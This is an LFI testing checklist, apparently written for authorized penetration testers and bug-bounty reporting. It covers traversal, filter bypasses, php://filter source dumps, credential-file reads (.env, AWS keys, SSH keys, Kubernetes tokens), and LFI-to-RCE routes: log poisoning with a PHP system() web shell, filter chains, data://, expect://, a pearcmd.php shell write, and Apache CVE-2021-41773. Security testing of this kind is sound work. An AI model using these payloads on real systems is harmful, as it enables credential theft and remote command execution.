# LFI — Checklist

Expert per-attack **test-case matrix** for LFI — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*16 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## LFI-001 — Enumerate file/path-selecting params
**Test Category:** Recon · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** page/file/template/lang/download/view/report/log-viewer params; PDF/export features

**Test Steps:** 1. Enumerate every param/feature that selects a file/path/template.<br>2. Fuzz param names (Arjun); check downloads/exports/PDF/report/log-viewer features; grep source for include/require/readFile/render with user input.<br>3. Note any base path/suffix leaked in errors/stack traces.

**Expected Result:** A list of file-selecting sinks and any leaked base path/suffix.

**Payload Example:**

```
?page= ?file= ?template= ?download= ; error leaks /var/www/html/ + .php suffix
```

**Impact:** Downloads/PDF/log-viewer features are the highest-value overlooked LFI sinks.

**Tools:** Burp, Arjun

**References:** CWE-98; OWASP Testing Guide: LFI (WSTG-ATHZ-01)

---

## LFI-002 — Baseline — traversal + READ vs INCLUDE + stack
**Test Category:** Baseline · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each candidate sink

**Test Steps:** 1. Confirm traversal by reading a known file (/etc/passwd, win.ini), sweeping depth 1-12.<br>2. Determine READ vs INCLUDE (raw source returned = read; executed output / poisoned PHP runs = include).<br>3. Identify the stack (PHP/Java/Node/Python/.NET) and any forced prefix dir / suffix extension.

**Expected Result:** Traversal confirmed, sink classified (read vs include), stack + forced prefix/suffix known.

**Payload Example:**

```
../../../../etc/passwd -> root:...:0:0 ; INCLUDE if poisoned PHP executes ; forced .php suffix
```

**Impact:** Read vs include decides whether this is disclosure (Medium) or RCE (Critical).

**Tools:** Burp Repeater

**References:** CWE-98; PortSwigger Web Security Academy: File path traversal / LFI

---

## LFI-003 — Directory escape (depth-sweep / absolute path)
**Test Category:** Reach the File · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Traversable sinks

**Test Steps:** 1. Depth-sweep ../ from 1 to 12; over-shoot is safe (root ignores extra ../).<br>2. Absolute path if no forced prefix: /etc/passwd.<br>3. Benign single-line proof: /etc/hostname (Windows: C:\Windows\win.ini).

**Expected Result:** A file outside the intended dir is read.

**Payload Example:**

```
../../../../../../etc/passwd ; /etc/passwd ; C:\Windows\win.ini
```

**Impact:** Confirms out-of-dir read (traversal = Medium until escalated).

**Tools:** Burp Repeater

**References:** CWE-98; CWE-22; PortSwigger Web Security Academy: File path traversal / LFI

---

## LFI-004 — Defeat forced suffix
**Test Category:** Reach the File · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Sinks that append a forced extension

**Test Steps:** 1. Null byte (legacy): ../../../../etc/passwd%00 ; double-encoded %2500.<br>2. php://filter makes the suffix land harmlessly on the resource.<br>3. If suffix forces .php and the sink INCLUDES, point at a real .php (read source) or a poisoned on-disk file.

**Expected Result:** The forced extension is bypassed and the target file is reached.

**Payload Example:**

```
../../../etc/passwd%00 ; php://filter/convert.base64-encode/resource=../../../etc/passwd
```

**Impact:** Restores arbitrary read/include despite a forced suffix.

**Tools:** Burp Repeater

**References:** CWE-98; CWE-22; HackTricks: LFI/RFI

---

## LFI-005 — Bypass ../ filtering (encoding / nested)
**Test Category:** Reach the File · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Sinks that strip or block ../

**Test Steps:** 1. Nested (defeats one-pass strip, most reliable): ....//....//....//etc/passwd.<br>2. Encodings: ..%2f (url), ..%252f (double), ..%c0%af (overlong), ..%5c (backslash).<br>3. Find the one that lands.

**Expected Result:** Traversal succeeds despite ../ filtering.

**Payload Example:**

```
....//....//....//etc/passwd ; ..%252f..%252f..%252fetc%252fpasswd
```

**Impact:** Bypasses naive ../ filters - proves the fix incomplete.

**Tools:** Burp Intruder

**References:** CWE-98; CWE-22; HackTricks: LFI/RFI

---

## LFI-006 — Allowlist / required-prefix bypass
**Test Category:** Reach the File · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Sinks requiring a prefix dir / allowed name

**Test Steps:** 1. Satisfy the required prefix, then traverse out: /var/www/html/uploads/../../../../etc/passwd.<br>2. Starts-with bypass: en/../../../../../etc/passwd.<br>3. Combine with php://filter for source.

**Expected Result:** The allowlist/prefix is satisfied and traversal still escapes.

**Payload Example:**

```
images/../../../../etc/passwd ; en/../../../config.php
```

**Impact:** Bypasses prefix/allowlist controls.

**Tools:** Burp Repeater

**References:** CWE-98; CWE-22; HackTricks: LFI/RFI

---

## LFI-007 — php://filter source &amp; secret disclosure (PHP)
**Test Category:** Impact — Disclosure · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** PHP include/read sinks

**Test Steps:** 1. Dump source as base64: php://filter/convert.base64-encode/resource=index.php (decode locally).<br>2. Pull config/.env/keys: config.php, wp-config.php, ../config/database.php, .env.<br>3. rot13 variant if needed.

**Expected Result:** Base64-decoding the response yields raw source / config secrets.

**Payload Example:**

```
php://filter/convert.base64-encode/resource=config.php | base64 -d ; resource=.env
```

**Impact:** Source + DB/cloud creds disclosure -&gt; chains further. High.

**Tools:** poc/phpfilter_dump.py, CyberChef

**References:** CWE-98; CWE-73; HackTricks: LFI/RFI

---

## LFI-008 — Secrets / cloud-creds / keys disclosure
**Test Category:** Impact — Disclosure · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** Any confirmed read sink

**Test Steps:** 1. Read high-value files: .env, /proc/self/environ, ~/.aws/credentials, ~/.ssh/id_rsa, k8s serviceaccount token, .git/config.<br>2. Windows: web.config (machineKey/conn strings), applicationHost.config.<br>3. Validate creds read-only; redact; pivot (SSRF/JWT).

**Expected Result:** Cloud/DB credentials or private keys are read from disk.

**Payload Example:**

```
/proc/self/environ ; ~/.aws/credentials ; /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Impact:** Credential/key disclosure -&gt; cloud/DB/auth compromise. High/Critical.

**Tools:** curl

**References:** CWE-98; CWE-73; HackTricks: LFI/RFI

---

## LFI-009 — LFI -&gt; RCE via log poisoning
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** INCLUDE sinks + a readable log

**Test Steps:** 1. Poison a log with PHP in a logged field: User-Agent: &lt;?php system($_GET['c']); ?&gt; (or a poisoned request path in access.log).<br>2. Include the log + pass the command: ?page=../../../../var/log/nginx/access.log&amp;c=id.<br>3. Also auth.log (ssh), mail.log (SMTP), /proc/self/fd/N.

**Expected Result:** Including the poisoned log executes your command.

**Payload Example:**

```
UA: <?php system($_GET['c']); ?> then ?page=../../../var/log/apache2/access.log&c=id
```

**Impact:** RCE via log poisoning - Critical.

**Tools:** Burp

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## LFI-010 — LFI -&gt; RCE via php://filter chain (no file write)
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PHP INCLUDE sinks

**Test Steps:** 1. Generate a working chain: php_filter_chain_generator --chain '&lt;?php system($_GET["c"]); ?&gt;'.<br>2. ?page=&lt;chain&gt;&amp;c=id -&gt; command executes with no file write needed.<br>3. Purely in-request.

**Expected Result:** The php://filter chain executes your command.

**Payload Example:**

```
?page=$(php_filter_chain_generator --chain '<?php system($_GET["c"]);?>')&c=id
```

**Impact:** RCE with no writable file needed - Critical.

**Tools:** synacktiv php_filter_chain_generator, poc/filter_chain_rce.py

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## LFI-011 — LFI -&gt; RCE via session / /proc / upload_progress
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PHP sessions, /proc/self/environ, session.upload_progress

**Test Steps:** 1. Session: store PHP in a reflected $_SESSION field, include ../../../var/lib/php/sessions/sess_&lt;PHPSESSID&gt;&amp;c=id.<br>2. /proc/self/environ (old CGI): poison via User-Agent then include it.<br>3. session.upload_progress (no reflected field): multipart PHP_SESSION_UPLOAD_PROGRESS=&lt;?php...?&gt; + RACE the sess_&lt;id&gt; include.

**Expected Result:** Including the poisoned session/proc file executes your command.

**Payload Example:**

```
?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>&c=id ; upload_progress race
```

**Impact:** RCE via session/proc poisoning - Critical.

**Tools:** Burp, curl

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## LFI-012 — LFI -&gt; RCE via wrappers (data:// / php://input / expect / phar)
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks with allow_url_include or wrapper support

**Test Steps:** 1. data://text/plain,&lt;?php system($_GET['c']);?&gt; (needs allow_url_include).<br>2. php://input with the PHP in the POST body.<br>3. expect://id ; phar:// deserialization.<br>4. Benign command proof.

**Expected Result:** A wrapper executes your benign command.

**Payload Example:**

```
?page=data://text/plain;base64,<b64 php> ; php://input (PHP in body) ; expect://id
```

**Impact:** RCE via PHP wrappers - Critical.

**Tools:** Burp

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## LFI-013 — LFI -&gt; RCE via pearcmd.php (default PHP image)
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Default PHP images with no upload/log path

**Test Steps:** 1. No upload/log? Use the bundled pearcmd: ?page=/usr/local/lib/php/pearcmd.php&amp;+config-create+...writes a shell.<br>2. Include the written shell -&gt; id.<br>3. Also upload+include / phpinfo temp-file race.

**Expected Result:** pearcmd writes a shell that is then included and executed.

**Payload Example:**

```
?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[c])?>+/tmp/x.php
```

**Impact:** RCE on a stock PHP image with no upload/log needed - Critical.

**Tools:** Burp

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## LFI-014 — Windows/infra traversal &amp; second-order LFI
**Test Category:** Impact — Variants · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Windows web.config, Apache 2.4.49/50, nginx alias, IIS, stored template/locale/filename

**Test Steps:** 1. Windows: read web.config machineKey/conn strings -&gt; forge auth.<br>2. Server/infra: Apache 2.4.49/50 /cgi-bin/.%2e/ (read+RCE), nginx alias off-by-slash, IIS unicode, proxy %2e/%2f decode mismatch.<br>3. Second-order: store a traversal/wrapper payload in a theme/template/locale/filename -&gt; the consumer reads/executes it (often higher-priv).

**Expected Result:** A Windows/infra/stored variant yields read or RCE.

**Payload Example:**

```
Apache 2.4.49 /cgi-bin/.%2e/%2e%2e/bin/sh ; web.config machineKey ; stored ../ in locale
```

**Impact:** Auth forge / unauth RCE / higher-priv second-order - High/Critical.

**Tools:** Burp, nuclei

**References:** CWE-98; CWE-22; Apache CVE-2021-41773; HackTricks: LFI/RFI

---

## LFI-015 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: /etc/passwd read reported as Critical (it's traversal proof ~Medium - escalate); a 404/error merely ECHOING your path (no contents); reading a file the app is meant to serve; php://filter of a non-sensitive file; blind timing with no demonstrated read/RCE; a client-side/source-map file mislabeled as server LFI.<br>2. REQUIRE: escalate past /etc/passwd to SECRETS or RCE.

**Expected Result:** Only secrets-disclosure or RCE candidates rate above Medium.

**Payload Example:**

```
passwd-only = Medium not Critical ; echoed path = not a read ; public asset = not LFI
```

**Impact:** Protects credibility; LFI is dense with passwd-only over-rated reports.

**Tools:** manual

**References:** CWE-98; PortSwigger Web Security Academy: File path traversal / LFI

---

## LFI-016 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest impact (RCE &gt; secret disclosure &gt; traversal).<br>2. Provide the payload, the disclosed secret (redacted) or the benign RCE marker (echo token / id), and the sink.<br>3. Set CVSS 3.1 + CWE-98/22/73 (+94 if RCE). Remediation: don't build file paths from user input; use an allowlist of fixed identifiers mapped to safe paths; disable allow_url_include and dangerous wrappers; canonicalize + confine to a base dir.<br>4. Benign markers, redact secrets, clean up poisoned logs/uploads/sessions; de-dupe, confirm on production.

**Expected Result:** A reproducible, correctly-rated PoC with clear remediation.

**Payload Example:**

```
PoC: payload + redacted secret / RCE marker + CVSS + CWE-98 + remediation.
```

**Impact:** Converts the read/RCE into a defensible High/Critical report at the right severity.

**Tools:** CVSS calculator, LFI_REPORT_TEMPLATE.md

**References:** CWE-98; CWE-22; CWE-73; FIRST CVSS v3.1; OWASP Testing Guide: LFI (WSTG-ATHZ-01)  |  TOP REFERENCES: synacktiv php_filter_chain_generator; Orange Tsai LFI-to-RCE research; PayloadsAllTheThings; HackTricks; PortSwigger

---
